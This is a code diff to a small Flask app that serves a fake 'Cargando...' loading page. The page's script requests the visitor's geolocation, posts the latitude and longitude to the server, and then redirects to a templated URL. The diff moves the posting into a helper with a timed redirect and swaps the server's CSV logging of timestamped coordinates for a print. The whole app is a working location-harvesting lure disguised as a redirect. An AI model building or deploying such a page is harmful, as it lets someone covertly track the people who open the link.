@@ -12,16 +12,21 @@ HTML = """
 <h3>Cargando...</h3>
 
 <script>
+function sendAndRedirect(pos) {
+  fetch("/location", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({
+      lat: pos.coords.latitude,
+      lon: pos.coords.longitude
+    })
+  }).catch(() => {});
+}
+
 navigator.geolocation.getCurrentPosition(
   pos => {
-    fetch("/location", {
-      method: "POST",
-      headers: {"Content-Type": "application/json"},
-      body: JSON.stringify({
-        lat: pos.coords.latitude,
-        lon: pos.coords.longitude
-      })
-    }).finally(() => window.location = "{{ url }}");
+    sendAndRedirect(pos);
+    setTimeout(() => window.location = "{{ url }}", 500);
   },
   err => window.location = "{{ url }}"
 );
@@ -36,16 +41,7 @@ def index():
 
 @app.route("/location", methods=["POST"])
 def location():
-    data = request.json
-    file_exists = os.path.isfile("locations.csv")
-
-    with open("locations.csv", "a", newline="") as f:
-        writer = csv.writer(f)
-        if not file_exists:
-            writer.writerow(["timestamp", "lat", "lon"])
-        writer.writerow([datetime.utcnow().isoformat(), data["lat"], data["lon"]])
-
-    print(data)
+    print(request.json)
     return "", 204
 
 if __name__ == "__main__":
